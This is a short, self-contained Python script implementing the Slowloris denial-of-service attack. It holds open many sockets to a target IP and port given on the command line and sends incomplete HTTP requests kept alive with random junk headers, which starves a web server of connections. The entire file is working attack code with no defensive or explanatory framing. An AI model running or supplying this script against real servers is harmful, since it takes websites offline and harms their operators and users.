import sys
import random
import socket
import time

# to determine you user_agent: https://www.whatismybrowser.com/detect/what-is-my-user-agent
user_agent = [
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.92 Safari/537.36']


def start_socket(ip, port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(4)

    s.connect((ip, int(port)))
    s.send("GET /?{} HTTP/1.1\r\n".format(random.randint(0, 2000)).encode("utf-8"))

    for agent in user_agent:
        s.send("User-Agent: {}\r\n".format(agent).encode("utf-8"))

    s.send("{}\r\n".format("Accept-language: en-US,en,q=0.5").encode("utf-8"))

    return s


def main():
    ip = sys.argv[1]
    port = sys.argv[2]
    socket_count = int(sys.argv[3])
    timer = int(sys.argv[4])
    sockets = []

    for i in range(int(socket_count)):
        try:
            s = start_socket(ip, port)
        except socket.error:
            break
        sockets.append(s)

    while True:
        try:
            print("keeping " + str(len(sockets)) + " open with keep-alive headers")

            for existingSocket in sockets:
                try:
                    existingSocket.send("X-a {}\r\n".format(random.randint(1, 5000)).encode('UTF-8'))
                except socket.error:
                    sockets.remove(existingSocket)

            for newSocket in range(socket_count - len(sockets)):
                try:
                    s = start_socket(ip, port)
                    if s:
                        sockets.append(s)
                except socket.error:
                    break

            time.sleep(timer)

        except (KeyboardInterrupt, SystemExit):
            print("Stopping Slowloris")
            break


main()
